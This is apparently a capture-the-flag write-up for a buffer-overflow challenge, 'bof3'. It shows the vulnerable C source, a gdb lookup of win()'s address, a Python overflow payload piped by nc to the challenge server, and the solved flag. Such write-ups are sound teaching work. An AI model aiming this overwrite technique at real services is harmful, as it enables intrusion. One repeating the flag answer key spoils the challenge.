# bof3

Both a binary and a C source file were given.

```
#include <stdio.h>
#include <stdlib.h>

void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}

void lose(void) {
	puts("you suck!\n");
	fflush(stdout);
	exit(0);
}

int main(void) {
	void (*fp)(); 
	char bof[64];
	
	fp = &lose;
	
	scanf("%s", bof);
	fp();
	return 0;
}

```
This challenge is almost the same as bof2.

To get the flag, ```fp``` has to be changed to the address of ```win()```; this can be found using the gdb debugger. The payload would be simply the address of win concatenated with 64 As.

```
$ gdb ./bof3
(gdb) print win
$1 = {<text variable, no debug info>} 0x8049256 <win>
```

**Solution**
```
$ python -c "print('A' * 64 + '\x56\x92\x04\x08')" > my_file
$ cat file my_file | nc ctf.hackucf.org 9002
```

**Flag**
```
flag{time_to_get_out_of_the_kiddie_pool}
```
